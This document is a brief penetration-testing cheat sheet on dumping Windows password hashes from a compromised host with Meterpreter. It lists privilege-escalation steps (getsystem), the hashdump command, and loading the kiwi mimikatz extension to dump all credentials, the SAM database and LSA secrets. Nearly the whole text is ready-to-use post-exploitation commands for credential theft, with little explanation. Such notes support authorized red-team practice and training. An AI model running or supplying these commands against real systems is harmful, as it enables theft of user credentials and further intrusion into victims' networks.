Dumping Hashes
**********************

Pre-Req
##################

*Make sure you root privileges*

.. code-block:: console

    run post/windows/gather/win_privs
    getsystem

Meterpreter
###################

dump the hashes
+++++++++++++++++++

.. code-block:: console

    hashdump

mimikatz from meterpreter
###############################

First load mimikatz from meterpeter.

.. code-block:: console

    load kiwi

You can use these commands to dump hashes

.. code-block:: console

    creds_all
    lsa_dump_sam
    lsa_dump_secrets
